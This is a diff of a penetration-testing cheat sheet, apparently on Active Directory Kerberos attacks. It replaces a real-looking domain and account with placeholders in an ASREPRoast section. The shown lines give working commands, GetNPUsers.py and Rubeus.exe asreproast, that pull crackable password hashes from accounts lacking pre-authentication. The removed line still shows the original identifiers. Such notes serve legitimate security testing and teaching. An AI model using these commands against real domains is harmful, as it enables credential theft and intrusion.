@@ -31,7 +31,7 @@ From Windows against single user using Rubeus.exe:
 
 ## ASREPRoast 
 If accounts do not require kerberos pre-authentication, the tool GetNPUsers.py can be used to do ASREPRoasting:   
-`GetNPUsers.py -request am.mt.mtnet/us30-zherosheroes:`   
+`GetNPUsers.py -request domain.local/someaccount:`   
 
 On Windows:   
 `.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast`   
